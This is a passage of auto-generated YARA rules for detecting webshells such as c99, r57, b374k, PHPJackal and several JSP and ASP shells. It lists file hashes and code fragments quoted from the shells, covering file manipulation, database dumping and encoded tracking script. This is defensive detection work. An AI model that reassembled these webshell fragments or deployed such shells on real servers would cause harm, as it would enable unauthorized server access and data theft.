      $s20 = "$s_python = check_access(\"python\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _newsh_c99v2_c99shell_ctt_sh_Shell__ci___Biz_was_here_c99_186 {
   meta:
      description = "webshell - from files newsh.php, c99v2.php, c99shell.php, ctt_sh.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "60a4730f359762d973d9cfc00093cdbddaa2ce4ca4c4e113a57c73e44353d93c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "\"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg\"." fullword ascii
      $s2 = "\"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7\"." fullword ascii
      $s3 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\"." fullword ascii
      $s4 = "\"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA\"." fullword ascii
      $s5 = "\"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB\"." fullword ascii
      $s6 = "\"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD\"." fullword ascii
      $s7 = "\"change\"=>" fullword ascii
      $s8 = "\"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s9 = "\"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt\"." fullword ascii
      $s10 = "\"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=\"," fullword ascii
      $s11 = "\"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=\"," fullword ascii
      $s12 = "\"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC\"." fullword ascii
      $s13 = "\"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7\"," fullword ascii
      $s14 = "\"ext_html\"=>" fullword ascii
      $s15 = "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s16 = "\"xhIAOw==\"," fullword ascii
      $s17 = "\"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc\"." fullword ascii
      $s18 = "\"small_unk\"=>" fullword ascii
      $s19 = "\"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA\"." fullword ascii
      $s20 = "\"u4tLAgEAOw==\"," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _in_Browser_download_warn_ma_leo_devshell_jfolder01_jsp_File_browser_3_JFolder_shell1_jsp_187 {
   meta:
      description = "webshell - from files in.jsp, Browser.jsp, download.jsp, warn.jsp, ma.jsp, leo.jsp, devshell.jsp, jfolder01.jsp, jsp_File_browser.jsp, 3.jsp, JFolder.jsp, shell1.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash3 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash4 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash5 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
      hash8 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash9 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash10 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
      hash11 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash12 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash13 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
   strings:
      $s1 = "public Hashtable processData(ServletInputStream is, String boundary, String saveInDir," fullword ascii
      $s2 = "public String getFileName(String dir, String fileName) throws IllegalArgumentException {" fullword ascii
      $s3 = "private synchronized String getLine(ServletInputStream sis) throws IOException {" fullword ascii
      $s4 = "if ((index = line.indexOf('\\n')) >= 0) line = line.substring(0, index - 1);" fullword ascii
      $s5 = "public String name = null, clientFileName = null, fileContentType = null;" fullword ascii
      $s6 = "if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {" fullword ascii
      $s7 = "if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {" fullword ascii
      $s8 = "if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir," fullword ascii
      $s9 = "if ((byte) boundary.charAt(i) != ba[i]) return false;" fullword ascii
      $s10 = "\"Boundary not found; boundary = \" + boundary + \", line = \" + line);" fullword ascii
      $s11 = "if (index >= 0) name = fileName.substring(index + 1);" fullword ascii
      $s12 = "if (index >= 0) fileName = name.substring(index + 1);" fullword ascii
      $s13 = "if (stFields.countTokens() < 2) throw new IllegalArgumentException(" fullword ascii
      $s14 = "if (stLine.countTokens() < 2) throw new IllegalArgumentException(" fullword ascii
      $s15 = "else name = fileName;" fullword ascii
      $s16 = "if (line.indexOf(\"form-data\") < 0) throw new IllegalArgumentException(" fullword ascii
      $s17 = "if (line == null || !line.startsWith(boundary)) return dataTable;" fullword ascii
      $s18 = "else os = new ByteArrayOutputStream(ONE_MB);" fullword ascii
      $s19 = "if (is == null) throw new IllegalArgumentException(\"InputStream\");" fullword ascii
      $s20 = "else fileInfo.file = new File(path);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _k8cmd_system1_jsp__188 {
   meta:
      description = "webshell - from files k8cmd.jsp, system1.jsp..jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3dc6ecb259bfbe4a6433806f5f262e4eedf8c9fac3d0a5e2de0cd89aed857666"
      hash2 = "71dc3008254f4bac53d5c888c0883250d5a81404ff2c944835d19f80b9b83b74"
   strings:
      $s1 = "out.println(\"<div align='center'><form action='?act=login' method='post'>\");" fullword ascii
      $s2 = "out.println(\"<input type='password' name='pass'/>\");" fullword ascii
      $s3 = "}if(act.equals(\"login\"))" fullword ascii
      $s4 = "out.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");" fullword ascii
      $s5 = "out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>\");" fullword ascii
      $s6 = "if(request.getSession().getAttribute(\"hehe\")!=null)" fullword ascii
      $s7 = "if (path!=null && !path.equals(\"\") && content!=null && !content.equals(\"\"))" fullword ascii
      $s8 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword ascii
      $s9 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%>" fullword ascii
      $s10 = "out.println(\"<textarea name='content' rows=15 cols=50></textarea><br>\");" fullword ascii
      $s11 = "out.println(\"Error\");" fullword ascii
      $s12 = "String path=request.getParameter(\"path\");" fullword ascii
      $s13 = "String url=request.getRequestURI();" fullword ascii
      $s14 = "String url2=request.getRealPath(request.getServletPath());" fullword ascii
      $s15 = "{act=request.getParameter(\"act\").toString();}" fullword ascii
      $s16 = "    if(pass.equals(password))" fullword ascii
      $s17 = "out.println(\"<input type='submit' value='save!'>\");" fullword ascii
      $s18 = "out.println(\"</form></div>\");" fullword ascii
      $s19 = "out.println(\"<font size=3><br></font><input type=text size=54 name='path'><br>\");" fullword ascii
      $s20 = "    String pass=request.getParameter(\"pass\");" fullword ascii
   condition:
      ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 6KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_decoded_elmaliseker_189 {
   meta:
      description = "webshell - from files shell_decoded.asp, elmaliseker.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
      hash2 = "aba1440e6fa797116ec2d0f0dda9278eae32ee2155ee0c5ae41dc4e02337bfbd"
   strings:
      $s1 = "FSO.DeleteFile itemPath,true" fullword ascii
      $s2 = "FSO.CreateTextFile(itemPath)" fullword ascii
      $s3 = "FSO.DeleteFolder itemPath,true" fullword ascii
      $s4 = "FSO.CreateFolder(itemPath)" fullword ascii
      $s5 = "if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then" fullword ascii
      $s6 = "Session(\"allow\")=1" fullword ascii
      $s7 = "set adoCon=Server.CreateObject(\"ADODB.Connection\")" fullword ascii
      $s8 = "FormatSize = intSize & \" B\"" fullword ascii
      $s9 = "set rS=nothing" fullword ascii
      $s10 = "ElseIf (intSize < 1024*1024) Then" fullword ascii
      $s11 = "set adoCon=nothing" fullword ascii
      $s12 = "dim adoCon, rS" fullword ascii
      $s13 = "FormatSize = FormatNumber(intSize/(1024*1024),2) & \" MB\"" fullword ascii
      $s14 = "If (intSize < 1024) Then" fullword ascii
      $s15 = "if (nfile>0) then" fullword ascii
      $s16 = "Function FormatSize(intSize)" fullword ascii
      $s17 = "if (rS.Fields(i).Name=\"\") then" fullword ascii
      $s18 = "if (ndir>0) then" fullword ascii
      $s19 = "for i=0 to rS.Fields.Count-1" fullword ascii
      $s20 = "FormatSize = FormatNumber(intSize/(1024*1024*1024),2) & \" GB\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_phpspy_2005_full_phpspy_2006_lnc_190 {
   meta:
      description = "webshell - from files shell.php, phpspy_2005_full.php, phpspy_2006.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash3 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash4 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $s1 = "$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN" ascii
      $s2 = "sqldumptable($currow[0], $filehandle);" fullword ascii
      $s3 = "@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);" fullword ascii
      $s4 = "$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN" ascii
      $s5 = "header(\"Accept-Ranges: bytes\");" fullword ascii
      $s6 = "header(\"Accept-Length: \".strlen($code));" fullword ascii
      $s7 = "elseif ($_GET['action'] == \"sqlbak\") {" fullword ascii
      $s8 = "$rows = mysql_query(\"SELECT * FROM $table\");" fullword ascii
      $s9 = "mysql_free_result($keys);" fullword ascii
      $s10 = "if ($kname != \"PRIMARY\" and $key['Non_unique'] == 0) {" fullword ascii
      $s11 = "$keys = mysql_query(\"SHOW KEYS FROM $table\");" fullword ascii
      $s12 = "$filehandle = @fopen($path,\"w\");" fullword ascii
      $s13 = "echo \"  </form>\\n\";" fullword ascii
      $s14 = "mysql_free_result($fields);" fullword ascii
      $s15 = "if (@filectime($filepath) == @filemtime($filepath)) {" fullword ascii
      $s16 = "fclose($filehandle);" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "$fields = mysql_query(\"SHOW FIELDS FROM $table\");" fullword ascii
      $s18 = "fwrite($filehandle,\"\\n\\n\\n\");" fullword ascii
      $s19 = "$result = mysql_query(\"SHOW tables\");" fullword ascii
      $s20 = "if ($filehandle) {" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mysql_interface_v1_0_MySQL_Web_Interface_Version_0_8_v4xGus6X_191 {
   meta:
      description = "webshell - from files Mysql interface v1.0.php, MySQL Web Interface Version 0.8.php, v4xGus6X.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbc14c68d1e9dfd7f8eb2ac283fc31031154a4e1a69240f180f6b564d1f8350a"
      hash2 = "8548e7070db852e66fcfe2f9aca057847a4a77171a083a715d450bb4149204ef"
      hash3 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
   strings:
      $s1 = "mysql_data_seek( $pResult, $page * $rowperpage );" fullword ascii
      $s2 = "$errMsg = mysql_error();" fullword ascii
      $s3 = "$key = substr( $key, 0, strlen($key)-4 );" fullword ascii
      $s4 = "$queryStr = \"ALTER TABLE $tablename DROP COLUMN $fieldname\";" fullword ascii
      $s5 = "$row = mysql_num_rows( $pResult );" fullword ascii
      $s6 = "$col = mysql_num_fields( $pResult );" fullword ascii
      $s7 = "else $page--;" fullword ascii
      $s8 = "$queryStr = stripslashes( $queryStr );" fullword ascii
      $s9 = "if( $field->numeric == 1 )" fullword ascii
      $s10 = "if( $tablename != \"\" )" fullword ascii
      $s11 = "echo \"<th>Name</th>\\n\";" fullword ascii
      $s12 = "if( $page == \"\" ) $page = 0;" fullword ascii
      $s13 = "echo \"<th>Type</th>\\n\";" fullword ascii
      $s14 = "echo \"<th>Function</th>\\n\";" fullword ascii
      $s15 = "$pResultLen = mysql_list_fields( $dbname, $tablename );" fullword ascii
      $s16 = "echo \"</table><p>\\n\";" fullword ascii
      $s17 = "echo \"<th colspan=2>Action</th>\\n\";" fullword ascii
      $s18 = "echo \"<th>Data</th>\\n\";" fullword ascii
      $s19 = "mysql_select_db( $dbname, $mysqlHandle );" fullword ascii
      $s20 = "if( $pTable == 0 ) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_3_2_2_b374k_3_2_3_192 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-3.2.2.php, b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash3 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $s1 = "if(function_exists('pg_connect')) return @pg_connect(\"$host_str user=$sqluser password=$sqlpass\");" fullword ascii
      $s2 = "function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){" fullword ascii
      $s3 = "$host_str = \"host=\".$hosts[0].\" port=\".$hosts[1];" fullword ascii
      $s4 = "if(count($hosts)==2){" fullword ascii
      $s5 = "return @sqlsrv_connect($sqlhost,$coninfo);" fullword ascii
      $s6 = "$hosts = explode(\":\", $sqlhost);" fullword ascii
      $s7 = "else $host_str = \"host=\".$sqlhost;" fullword ascii
      $s8 = "$coninfo = array(\"UID\"=>$sqluser, \"PWD\"=>$sqlpass);" fullword ascii
      $s9 = "if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);" fullword ascii
      $s10 = "function sql_close($sqltype,$con){" fullword ascii
      $s11 = "foreach($interesting as $f){" fullword ascii
      $s12 = "else $showtbl = \"\";" fullword ascii
      $s13 = "if(is_array($metadata)) return $metadata['count'];" fullword ascii
      $s14 = "elseif($sqltype == 'pgsql'){" fullword ascii
      $s15 = "if(is_array($metadata)) return $metadata['Name'];" fullword ascii
      $s16 = "if(empty($r)) $r = \" \";" fullword ascii
      $s17 = "@proc_close($proc);" fullword ascii
      $s18 = "elseif($sqltype == 'sqlite3'){" fullword ascii
      $s19 = "elseif($sqltype == 'mssql'){" fullword ascii
      $s20 = "function sql_query($sqltype, $query, $con){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57_Mohajer22_r57_kartal_r57_r57_iFX_193 {
   meta:
      description = "webshell - from files r57shell127.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash3 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash4 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR" fullword ascii /* base64 encoded string ''x'+screen.height+"&px="+(((navigator.appName.substring(0,3)=="Mic"))?screen.colorDept' */
      $s2 = "JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l" fullword ascii /* base64 encoded string '&im=1&r="+escape(document.referrer)+"&pg="+escape(window.location.href);document.cooki' */
      $s3 = "dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB" fullword ascii /* base64 encoded string 'tlog/count?"+hotlog_r+"&' border=0 width=1 height=1 alt=1></a>")</script><noscript><a ' */
      $s4 = "if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo \"<br><div align=center><font face=Verdana size=-2><b>[ <a href=\".$_SERVER[" ascii
      $s5 = "if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo \"<br><div align=center><font face=Verdana size=-2><b>[ <a href=\".$_SERVER[" ascii
      $s6 = "IGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnl" fullword ascii
      $s7 = "ocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2" fullword ascii
      $s8 = "i8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hv" fullword ascii
      $s9 = "hZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJz" fullword ascii
      $s10 = "er><b>\".$text.$i.\"</b></div></font></td></tr></table>\";" fullword ascii
      $s11 = "echo \"<br><div align=center><font face=Verdana size=-2><b>[ <a href=\".$_SERVER['PHP_SELF'].\">BACK</a> ]</b></font></div>\";" fullword ascii
      $s12 = " echo \"<br><div align=center><font face=Verdana size=-2><b>[ <a href=\".$_SERVER['PHP_SELF'].\">BACK</a> ]</b></font></div>\"; " ascii
      $s13 = "  echo \"<br><div align=center><font face=Verdana size=-2><b>[ <a href=\".$_SERVER['PHP_SELF'].\">BACK</a> ]</b></font></div>\";" ascii
      $s14 = "tzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5wa" fullword ascii
      $s15 = "oOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGxvZ19qcz0iMS4zIjwvc2NyaXB0Pj" fullword ascii
      $s16 = "$c2 = \"PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxh" fullword ascii
      $s17 = "FnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2pzPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L" fullword ascii
      $s18 = "lPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhkb2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndW" fullword ascii
      $s19 = "$c1 = \"PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2" fullword ascii
      $s20 = "HP_SELF'].\">BACK</a> ]</b></font></div>\"; die(); }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHPJackal_itsec_194 {
   meta:
      description = "webshell - from files PHPJackal.php, itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "27c9cc91bc0a23939e526012b8b3355b8e1d2c460286595452cd2b7d750f9a16"
      hash2 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $s1 = "ociexecute($stm,OCI_DEFAULT);" fullword ascii
      $s2 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword ascii
      $s3 = "$link=mssql_connect($host,$user,$pass);" fullword ascii
      $s4 = "$link=ocilogon($user,$pass,$db);" fullword ascii
      $s5 = "$link=mysql_connect($host,$user,$pass);" fullword ascii
      $s6 = "function querY($type,$host,$user,$pass,$db='',$query){" fullword ascii
      $s7 = "if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){" fullword ascii
      $s8 = "$res=querY($type,$server,$user,$pass,$db,$query);" fullword ascii
      $s9 = "$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];" fullword ascii
      $s10 = "while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s11 = "for($i=0;$i<pg_num_fields($result);$i++)" fullword ascii
      $s12 = "if(!empty($db))mssql_select_db($db,$link);" fullword ascii
      $s13 = "mssql_close($link);" fullword ascii
      $s14 = "$res.=pg_field_name($result,$i).'[-][-][-]';" fullword ascii
      $s15 = "for($i=0;$i<mssql_num_fields($result);$i++)" fullword ascii
      $s16 = "while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s17 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s18 = "$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];" fullword ascii
      $s19 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s20 = "$res.=mysql_field_name($result,$i).'[-][-][-]';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _utils_jdbc_jsp_195 {
   meta:
      description = "webshell - from files utils.jsp, jdbc.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4bfe0d96c929ca04283f61b88dc2382fa4f5f6ea5735f0c3d3900c590e98bda6"
      hash2 = "c8ef23e6759e2dd84f28fc1ec5ae913b35c8efb05dd6aa2951aed9fe867553a1"
      hash3 = "322807a2af30c73616c67862e736796f59efe1508ee0fe6ddb1e04f10ef72c06"
   strings:
      $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(q);" fullword ascii
      $s3 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
      $s4 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
      $s5 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
      $s6 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
      $s7 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
      $s8 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
      $s9 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
      $s10 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
      $s11 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
      $s12 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
      $s13 = ".getRequestURI())).getParent();" fullword ascii
      $s14 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
      $s15 = "new InputStreamReader(new FileInputStream(new File(" fullword ascii
      $s16 = "+ \")\\t\");" fullword ascii
      $s17 = "+ \"\\t\" + sQ + \"\\n\");" fullword ascii
      $s18 = "c.setCatalog(x[2].trim());" fullword ascii
      $s19 = "+ sQ + \"\\n\";" fullword ascii
      $s20 = "String s = new File(application.getRealPath(request" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_2014_asp__1___2013__vps__196 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, 2014.asp, asp (1).asp, .asp, 2013.asp, .asp, vps.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash5 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash6 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash8 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash9 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash10 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
